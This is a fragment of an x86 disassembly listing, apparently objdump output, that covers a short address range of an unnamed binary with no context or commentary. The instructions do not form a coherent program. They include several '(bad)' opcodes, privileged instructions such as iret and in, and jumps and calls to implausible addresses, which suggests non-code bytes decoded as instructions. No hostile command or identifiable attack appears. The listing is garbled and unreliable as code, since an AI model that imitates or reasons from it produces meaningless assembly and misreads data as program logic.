  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
